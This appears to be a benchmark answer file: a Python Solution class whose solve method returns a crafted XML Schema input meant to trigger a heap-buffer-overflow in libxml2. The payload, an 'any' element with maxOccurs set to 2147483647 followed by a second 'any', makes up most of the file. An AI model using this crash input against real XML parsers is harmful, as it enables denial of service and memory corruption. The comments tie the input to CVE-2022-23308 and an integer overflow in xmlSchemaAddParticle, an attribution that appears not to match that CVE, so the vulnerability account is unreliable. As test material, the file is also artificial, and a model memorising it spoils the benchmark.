class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # This PoC is based on the minimized reproducer from oss-fuzz issue 42536068,
        # which corresponds to CVE-2022-23308 in libxml2. The vulnerability is a
        # heap-buffer-overflow in the `xmlSchemaAddParticle` function during the
        # parsing of a crafted XML schema.
        #
        # The schema defines a complexType that restricts 'anyType'. Inside the
        # restriction, a sequence contains two 'any' elements. The first 'any'
        # has its `maxOccurs` attribute set to the maximum value for a signed
        # 32-bit integer (2147483647).
        #
        # During schema parsing, when the second 'any' element is added to the
        # sequence, an integer overflow occurs in the code responsible for
        # calculating the buffer size for schema particles. This results in a
        # smaller-than-required buffer being allocated. The subsequent write
        # to this buffer overflows, causing heap corruption.
        poc = (
            b'<schema xmlns="http://www.w3.org/2001/XMLSchema">'
            b'<complexType><complexContent><restriction base="anyType">'
            b'<sequence><any maxOccurs="2147483647"/><any/></sequence>'
            b'</restriction></complexContent></complexType></schema>'
        )
        return poc